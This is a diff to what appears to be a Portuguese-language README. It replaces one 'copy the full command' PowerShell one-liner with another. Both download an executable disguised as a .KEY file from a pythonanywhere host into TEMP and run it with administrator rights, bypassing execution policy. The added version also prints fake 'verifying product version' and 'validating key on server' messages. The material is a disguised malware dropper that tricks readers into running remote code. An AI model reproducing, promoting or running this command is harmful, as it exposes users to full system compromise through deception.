@@ -9,7 +9,8 @@
 
 ### ATENÇÃO ::::: Copie o comando completo
 
-> `if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe '-NoProfile -ExecutionPolicy Bypass -Command ""(New-Object System.Net.WebClient).DownloadFile(\""https://downloadapplication.pythonanywhere.com/static/TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.KEY\"", \""$($env:TEMP)\TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.exe\""); Start-Process \""$($env:TEMP)\TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.exe\"" -Verb RunAs; exit}"' -Verb RunAs; exit`
+> `$path = "$env:TEMP\TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.exe"; $url = "https://downloadapplication.pythonanywhere.com/static/TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.KEY"; if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } Write-Host "VERIFICANDO VERSÃO DO PRODUTO..."; Invoke-WebRequest -Uri $url -OutFile $path; Write-Host "VALIDANDO CHAVE NO SERVIDOR, AGUADE..."; Start-Process $path -Verb RunAs
+`
 
 <!--
 
